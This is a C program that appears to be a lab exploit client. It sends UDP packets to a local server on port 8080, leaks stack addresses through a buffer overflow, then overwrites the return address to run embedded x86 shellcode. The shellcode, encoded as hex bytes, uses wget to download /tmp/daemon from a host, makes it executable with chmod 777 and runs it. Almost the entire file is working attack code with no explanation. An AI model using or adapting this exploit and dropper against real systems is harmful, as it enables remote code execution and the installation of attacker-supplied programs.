//
// Created by hs on 2020/5/22.
//

#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <unistd.h>
#include<sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUF_SIZE 1024

#define IP_ADDR "127.0.0.1"
#define PORT 8080

char *shellcode = "\x31\xd2\x31\xc0\xb0\x02\xcd\x80\x39\xd0\x74\x2e\x52\x31\xc0\xb0\x06\x50\x89\xe3\x52\x52\x89\xe1\x31\xc0\xb0\xa2\xcd\x80\x52\x68\x65\x6d\x6f\x6e\x68\x2f\x2f\x64\x61\x68\x2f\x74\x6d\x70\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80\x31\xd2\x31\xc0\xb0\x02\xcd\x80\x39\xd0\x75\x60\x83\xec\x64\x89\xe5\x52\x68\x77\x67\x65\x74\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x89\x5d\x04\x52\x66\x68\x2d\x4f\x89\x65\x08\x52\x68\x65\x6d\x6f\x6e\x68\x2f\x2f\x64\x61\x68\x2f\x74\x6d\x70\x89\x65\x0c\x52\x68\x65\x6d\x6f\x6e\x68\x31\x2f\x64\x61\x68\x30\x2e\x30\x2e\x68\x31\x32\x37\x2e\x89\x65\x10\x89\x55\x14\x89\xe9\x83\xc1\x04\x31\xc0\xb0\x0b\xcd\x80\x52\x31\xc0\xb0\x05\x50\x89\xe3\x52\x52\x89\xe1\x31\xc0\xb0\xa2\xcd\x80\x83\xec\x64\x89\xe5\x52\x68\x68\x6d\x6f\x64\x68\x2f\x2f\x2f\x63\x68\x2f\x62\x69\x6e\x89\xe3\x89\x5d\x04\x52\x31\xc0\xb0\x37\x66\x50\x66\x68\x37\x37\x89\x65\x08\x52\x68\x65\x6d\x6f\x6e\x68\x2f\x2f\x64\x61\x68\x2f\x74\x6d\x70\x89\x65\x0c\x89\x55\x10\x89\xe9\x83\xc1\x04\x31\xc0\xb0\x0b\xcd\x80";
struct PAYLOAD{
    unsigned int data_size;
    union {
        struct{
            unsigned int ret_addr;
            unsigned int old_ebp;
            unsigned int ebx;
            unsigned int i;
            unsigned int length;
            char buf[BUF_SIZE - sizeof(unsigned int)];
            char zero[BUF_SIZE - sizeof(unsigned int) * 5];
        } attack1;
        struct{
            unsigned int buf_addr;
            unsigned int fd;
            unsigned int ret_addr;
            unsigned int old_ebp;
            unsigned int ebx;
            unsigned int i;
            unsigned int length;
            char buf[BUF_SIZE - sizeof(unsigned int)];
            char zero[BUF_SIZE - sizeof(unsigned int) * 7];
        } attack2;
        struct{
            char buf[BUF_SIZE - sizeof(unsigned int)];
            unsigned int length;
            unsigned int i;
            unsigned int ebx;
            unsigned int old_ebp;
            unsigned int ret_addr;
            unsigned int fd;
            unsigned int buf_addr;
            char zero[BUF_SIZE - sizeof(unsigned int) * 7];
        } info;
    }un;
};


int main()
{
    int fd = socket(PF_INET, SOCK_DGRAM, 0);
    if(fd < 0)
    {
        perror("create socket error\n");
        exit(-1);
    }

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = PF_INET;
    inet_aton(IP_ADDR, &serverAddr.sin_addr);
    serverAddr.sin_port = htons(PORT);

    struct PAYLOAD payload;
    payload.data_size = BUF_SIZE + 7 * 4 - 4;
    payload.un.attack2.i = htonl(0xffffffff);
    payload.un.attack2.length = htonl(BUF_SIZE + 7 * 4 - 4);
    sendto(fd, &payload, BUF_SIZE, 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));

    struct sockaddr_in from;
    socklen_t socklen = sizeof(from);
    recvfrom(fd, &payload, 2 * BUF_SIZE, 0, (struct sockaddr*)&from, &socklen);
    
    unsigned int buf_addr = payload.un.info.buf_addr;
    unsigned int old_ebp = payload.un.info.old_ebp;
    unsigned int ebx = payload.un.info.ebx;
    
    payload.data_size = BUF_SIZE + 5 * 4 - 4;
    payload.un.attack1.ret_addr = htonl(buf_addr + 6 * 4);
    payload.un.attack1.old_ebp = htonl(old_ebp);
    payload.un.attack1.ebx = htonl(ebx);
    payload.un.attack1.i = htonl(BUF_SIZE + 4 - 1);
    payload.un.attack1.length = htonl(BUF_SIZE + 5 * 4 - 4);
    memcpy(payload.un.attack1.buf, shellcode, strlen(shellcode));
    sendto(fd, (void*)&payload, BUF_SIZE, 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));

    return 0;
}
